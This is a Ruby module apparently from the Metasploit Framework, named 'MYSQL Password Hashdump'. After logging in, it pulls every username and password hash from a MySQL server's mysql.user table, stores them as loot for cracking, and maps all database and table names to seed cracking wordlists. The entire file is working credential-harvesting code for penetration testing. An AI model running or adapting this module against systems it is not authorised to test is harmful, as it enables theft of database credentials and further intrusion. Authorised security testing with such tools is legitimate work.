##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MYSQL
	include Msf::Auxiliary::Report

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'MYSQL Password Hashdump',
			'Version'        => '$Revision$',
			'Description'    => %Q{
					This module extracts the usernames and encrypted password
				hashes from a MySQL server and stores them for later cracking.
			},
			'Author'         => ['TheLightCosine <thelightcosine[at]gmail.com>'],
			'License'        => MSF_LICENSE
		)
	end

	def run_host(ip)

		if (not mysql_login_datastore)
			print_error("Invalid MySQL Server credentials")
			return
		end

		#Grabs the username and password hashes and stores them as loot
		res = mysql_query("SELECT user,password from mysql.user")
		if res.nil?
			print_error("There was an error reading the MySQL User Table")
			return
		end

		#create a table to store data
		tbl = Rex::Ui::Text::Table.new(
			'Header'  => 'MysQL Server Hashes',
			'Ident'   => 1,
			'Columns' => ['Username', 'Hash']
		)

		if res.size > 0
			res.each do |row|
				tbl << [row[0], row[1]]
				print_good("Saving HashString as Loot: #{row[0]}:#{row[1]}")
			end
		end

		report_hashes(tbl.to_csv) unless tbl.rows.empty?

		#Recursively grab the schema for the entire DB server
		mysql_schema={}
		res = mysql_query("show databases")
		if res.size > 0
			res.each do |row|
				next if row[0].nil?
				next if row[0].empty?
				next if row[0]== "information_schema"
				next if row[0]== "mysql"
				next if row[0]== "performance_schema"
				next if row[0]== "test"
				mysql_schema[row[0]]= get_tbl_names(row[0])
			end
		end	
		report_other_data(mysql_schema)
	end

	#Stores the Hash Table as Loot for Later Cracking
	def report_hashes(hash_loot)

		filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_mysqlhashes.txt"
		path = store_loot("mysql.hashes", "text/plain", datastore['RHOST'], hash_loot, filename, "MySQL Hashes")
		print_status("Hash Table has been saved: #{path}")

	end

	#Gets all of the Tables names inside the given Database
	def get_tbl_names(dbname)

		tables=[]
		res = mysql_query("SHOW tables from #{dbname}")
		if res.size > 0
			res.each do |row|
				next if row[0].nil?
				next if row[0].empty?
				tables<<row[0]
			end
		end
		return tables

	end

	#Saves the Database Schema as Notes for later use.
	#Will be used for seeding wordlists when cracking
	def report_other_data(mysql_schema)

		unless mysql_schema.nil?
			report_note(
				:host  => rhost,
				:type  => "mysql.schema",
				:data  => mysql_schema,
				:port  => rport,
				:proto => 'tcp',
				:update => :unique_data
			)
		end

	end

end
